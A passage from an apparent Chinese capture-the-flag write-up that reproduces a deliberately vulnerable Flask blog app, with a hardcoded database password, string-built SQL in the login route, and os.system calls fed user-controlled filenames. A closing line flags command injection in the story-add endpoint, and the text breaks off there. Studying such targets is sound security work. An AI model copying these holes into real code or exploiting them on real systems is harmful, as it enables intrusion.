class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session, redirect, url_for, request, render_template<br><span class="hljs-keyword">from</span> mysql.connector <span class="hljs-keyword">import</span> errorcode<br><span class="hljs-keyword">import</span> mysql.connector<br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> PIL<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, UnidentifiedImageError<br><span class="hljs-keyword">import</span> hashlib<br><br>app = Flask(__name__,static_url_path=<span class="hljs-string">&#x27;&#x27;</span>,static_folder=<span class="hljs-string">&#x27;static&#x27;</span>,template_folder=<span class="hljs-string">&#x27;templates&#x27;</span>)<br><br><span class="hljs-comment">#Define connection for database</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">connections</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        connector = mysql.connector.connect(user=<span class="hljs-string">&#x27;admin&#x27;</span>, password=<span class="hljs-string">&#x27;ToughPasswordToCrack&#x27;</span>, host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, database=<span class="hljs-string">&#x27;writer&#x27;</span>)<br>        <span class="hljs-keyword">return</span> connector<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-keyword">if</span> err.errno == errorcode.ER_ACCESS_DENIED_ERROR:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Something is wrong with your db user name or password!&quot;</span>)<br>        <span class="hljs-keyword">elif</span> err.errno == errorcode.ER_BAD_DB_ERROR:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database does not exist&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Another exception, returning!&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> (<span class="hljs-string">&#x27;Connection to DB is ready!&#x27;</span>)<br><br><span class="hljs-comment">#Define homepage</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">home_page</span>():</span><br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM stories;&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/blog.html&#x27;</span>, results=results)<br><br><span class="hljs-comment">#Define about page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/about&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">about</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/about.html&#x27;</span>)<br><br><span class="hljs-comment">#Define contact page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/contact&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">contact</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/contact.html&#x27;</span>)<br><br><span class="hljs-comment">#Define blog posts</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/blog/post/&lt;id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">blog_post</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    cursor = connector.cursor()<br>    cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories WHERE id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>    results = cursor.fetchall()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM stories;&quot;</span><br>    cursor.execute(sql_command)<br>    stories = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;blog/blog-single.html&#x27;</span>, results=results, stories=stories)<br><br><span class="hljs-comment">#Define dashboard for authenticated users</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dashboard</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;dashboard.html&#x27;</span>)<br><br><span class="hljs-comment">#Define stories page for dashboard and edit/delete pages</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">stories</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;Select * From stories;&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;stories.html&#x27;</span>, results=results)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories/add&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add_story</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        <span class="hljs-keyword">if</span> request.files[<span class="hljs-string">&#x27;image&#x27;</span>]:<br>            image = request.files[<span class="hljs-string">&#x27;image&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image.filename:<br>                path = os.path.join(<span class="hljs-string">&#x27;/var/www/writer.htb/writer/static/img/&#x27;</span>, image.filename)<br>                image.save(path)<br>                image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image.filename)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br><br>        <span class="hljs-keyword">if</span> request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>):<br>            image_url = request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image_url:<br>                <span class="hljs-keyword">try</span>:<br>                    local_filename, headers = urllib.request.urlretrieve(image_url)<br>                    os.system(<span class="hljs-string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename, local_filename))<br>                    image = <span class="hljs-string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename)<br>                    <span class="hljs-keyword">try</span>:<br>                        im = Image.<span class="hljs-built_in">open</span>(image) <br>                        im.verify()<br>                        im.close()<br>                        image = image.replace(<span class="hljs-string">&#x27;/tmp/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>                        os.system(<span class="hljs-string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image, image))<br>                        image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image)<br>                    <span class="hljs-keyword">except</span> PIL.UnidentifiedImageError:<br>                        os.system(<span class="hljs-string">&quot;rm &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image))<br>                        error = <span class="hljs-string">&quot;Not a valid image file!&quot;</span><br>                        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br>                <span class="hljs-keyword">except</span>:<br>                    error = <span class="hljs-string">&quot;Issue uploading picture&quot;</span><br>                    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>, error=error)<br>        author = request.form.get(<span class="hljs-string">&#x27;author&#x27;</span>)<br>        title = request.form.get(<span class="hljs-string">&#x27;title&#x27;</span>)<br>        tagline = request.form.get(<span class="hljs-string">&#x27;tagline&#x27;</span>)<br>        content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;INSERT INTO stories VALUES (NULL,%(author)s,%(title)s,%(tagline)s,%(content)s,&#x27;Published&#x27;,now(),%(image)s);&quot;</span>, &#123;<span class="hljs-string">&#x27;author&#x27;</span>:author,<span class="hljs-string">&#x27;title&#x27;</span>: title,<span class="hljs-string">&#x27;tagline&#x27;</span>: tagline,<span class="hljs-string">&#x27;content&#x27;</span>: content, <span class="hljs-string">&#x27;image&#x27;</span>:image &#125;)<br>        result = connector.commit()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard/stories&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;add.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories/edit/&lt;id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit_story</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        results = cursor.fetchall()<br>        <span class="hljs-keyword">if</span> request.files[<span class="hljs-string">&#x27;image&#x27;</span>]:<br>            image = request.files[<span class="hljs-string">&#x27;image&#x27;</span>]<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image.filename:<br>                path = os.path.join(<span class="hljs-string">&#x27;/var/www/writer.htb/writer/static/img/&#x27;</span>, image.filename)<br>                image.save(path)<br>                image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image.filename)<br>                cursor = connector.cursor()<br>                cursor.execute(<span class="hljs-string">&quot;UPDATE stories SET image = %(image)s WHERE id = %(id)s&quot;</span>, &#123;<span class="hljs-string">&#x27;image&#x27;</span>:image, <span class="hljs-string">&#x27;id&#x27;</span>:<span class="hljs-built_in">id</span>&#125;)<br>                result = connector.commit()<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>        <span class="hljs-keyword">if</span> request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>):<br>            image_url = request.form.get(<span class="hljs-string">&#x27;image_url&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">in</span> image_url:<br>                <span class="hljs-keyword">try</span>:<br>                    local_filename, headers = urllib.request.urlretrieve(image_url)<br>                    os.system(<span class="hljs-string">&quot;mv &#123;&#125; &#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename, local_filename))<br>                    image = <span class="hljs-string">&quot;&#123;&#125;.jpg&quot;</span>.<span class="hljs-built_in">format</span>(local_filename)<br>                    <span class="hljs-keyword">try</span>:<br>                        im = Image.<span class="hljs-built_in">open</span>(image) <br>                        im.verify()<br>                        im.close()<br>                        image = image.replace(<span class="hljs-string">&#x27;/tmp/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br>                        os.system(<span class="hljs-string">&quot;mv /tmp/&#123;&#125; /var/www/writer.htb/writer/static/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image, image))<br>                        image = <span class="hljs-string">&quot;/img/&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image)<br>                        cursor = connector.cursor()<br>                        cursor.execute(<span class="hljs-string">&quot;UPDATE stories SET image = %(image)s WHERE id = %(id)s&quot;</span>, &#123;<span class="hljs-string">&#x27;image&#x27;</span>:image, <span class="hljs-string">&#x27;id&#x27;</span>:<span class="hljs-built_in">id</span>&#125;)<br>                        result = connector.commit()<br><br>                    <span class="hljs-keyword">except</span> PIL.UnidentifiedImageError:<br>                        os.system(<span class="hljs-string">&quot;rm &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(image))<br>                        error = <span class="hljs-string">&quot;Not a valid image file!&quot;</span><br>                        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    error = <span class="hljs-string">&quot;Issue uploading picture&quot;</span><br>                    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;File extensions must be in .jpg!&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, error=error, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br>        title = request.form.get(<span class="hljs-string">&#x27;title&#x27;</span>)<br>        tagline = request.form.get(<span class="hljs-string">&#x27;tagline&#x27;</span>)<br>        content = request.form.get(<span class="hljs-string">&#x27;content&#x27;</span>)<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;UPDATE stories SET title = %(title)s, tagline = %(tagline)s, content = %(content)s WHERE id = %(id)s&quot;</span>, &#123;<span class="hljs-string">&#x27;title&#x27;</span>:title, <span class="hljs-string">&#x27;tagline&#x27;</span>:tagline, <span class="hljs-string">&#x27;content&#x27;</span>:content, <span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        result = connector.commit()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard/stories&#x27;</span>)<br><br>    <span class="hljs-keyword">else</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        results = cursor.fetchall()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/stories/delete/&lt;id&gt;&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_story</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;DELETE FROM stories WHERE id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        result = connector.commit()<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard/stories&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        cursor = connector.cursor()<br>        cursor.execute(<span class="hljs-string">&quot;SELECT * FROM stories where id = %(id)s;&quot;</span>, &#123;<span class="hljs-string">&#x27;id&#x27;</span>: <span class="hljs-built_in">id</span>&#125;)<br>        results = cursor.fetchall()<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;delete.html&#x27;</span>, results=results, <span class="hljs-built_in">id</span>=<span class="hljs-built_in">id</span>)<br><br><span class="hljs-comment">#Define user page for dashboard</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/users&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">users</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Database Error&quot;</span><br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM users;&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;users.html&#x27;</span>, results=results)<br><br><span class="hljs-comment">#Define settings page</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard/settings&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">settings</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        connector = connections()<br>    <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Database Error!&quot;</span><br>    cursor = connector.cursor()<br>    sql_command = <span class="hljs-string">&quot;SELECT * FROM site WHERE id = 1&quot;</span><br>    cursor.execute(sql_command)<br>    results = cursor.fetchall()<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;settings.html&#x27;</span>, results=results)<br><br><span class="hljs-comment">#Define authentication mechanism</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/administrative&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login_page</span>():</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/dashboard&#x27;</span>)<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;uname&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        password = hashlib.md5(password.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br>        <span class="hljs-keyword">try</span>:<br>            connector = connections()<br>        <span class="hljs-keyword">except</span> mysql.connector.Error <span class="hljs-keyword">as</span> err:<br>            <span class="hljs-keyword">return</span> (<span class="hljs-string">&quot;Database error&quot;</span>)<br>        <span class="hljs-keyword">try</span>:<br>            cursor = connector.cursor()<br>            sql_command = <span class="hljs-string">&quot;Select * From users Where username = &#x27;%s&#x27; And password = &#x27;%s&#x27;&quot;</span> % (username, password)<br>            cursor.execute(sql_command)<br>            results = cursor.fetchall()<br>            <span class="hljs-keyword">for</span> result <span class="hljs-keyword">in</span> results:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Got result&quot;</span>)<br>            <span class="hljs-keyword">if</span> result <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(result) != <span class="hljs-number">0</span>:<br>                session[<span class="hljs-string">&#x27;user&#x27;</span>] = username<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;success.html&#x27;</span>, results=results)<br>            <span class="hljs-keyword">else</span>:<br>                error = <span class="hljs-string">&quot;Incorrect credentials supplied&quot;</span><br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=error)<br>        <span class="hljs-keyword">except</span>:<br>            error = <span class="hljs-string">&quot;Incorrect credentials supplied&quot;</span><br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=error)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/logout&quot;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (<span class="hljs-string">&#x27;user&#x27;</span> <span class="hljs-keyword">in</span> session):<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br>    session.pop(<span class="hljs-string">&#x27;user&#x27;</span>)<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>   app.run(<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br></code></pre></div></td></tr></table></figure><p>接口@app.route(‘/dashboard/stories/add’, methods=[‘GET’, ‘POST’])存在一个命令注入漏洞</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">if</span> request.form.get(<span 